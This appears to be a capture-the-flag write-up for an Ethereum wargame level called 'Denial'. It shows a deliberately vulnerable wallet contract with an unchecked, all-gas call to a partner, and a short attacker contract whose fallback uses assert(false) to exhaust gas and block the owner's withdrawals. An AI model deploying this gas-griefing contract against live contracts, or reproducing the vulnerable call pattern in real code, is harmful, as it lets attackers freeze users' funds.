# 20. Denial

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Vulnerability

The vulnerability lies on this line : `partner.call{value:amountToSend}("");` as call will by default forward all gas available.
It is possible for the partner contract to consume all of it and forbid the caller to continue execution.

The easiest way to consume all gas is to provide and invalid OPCODE with `assert(false);`

The following contract can solve the challenge :

```solidity
pragma solidity 0.8.4;

contract TargetCall {
    event GasAmount(uint256);
    
    fallback() external payable {
        assert(false);
    }
}
```

## Side note on Solidity >= 0.8.5

There is a different behaviour in versions equal and above 0.8.5 :

the `assert(false)` gets compiled to : `0xFDFE` : `REVERT INVALID`. THis means that the code will revert and not assert, refunding gas and allowing execution to continue for the caller.

Modifying the bytecode solves that issue but is certainly not the cleanest way to do it. See (my answer)[https://ethereum.stackexchange.com/a/113362/84305] to a related question for more informations.

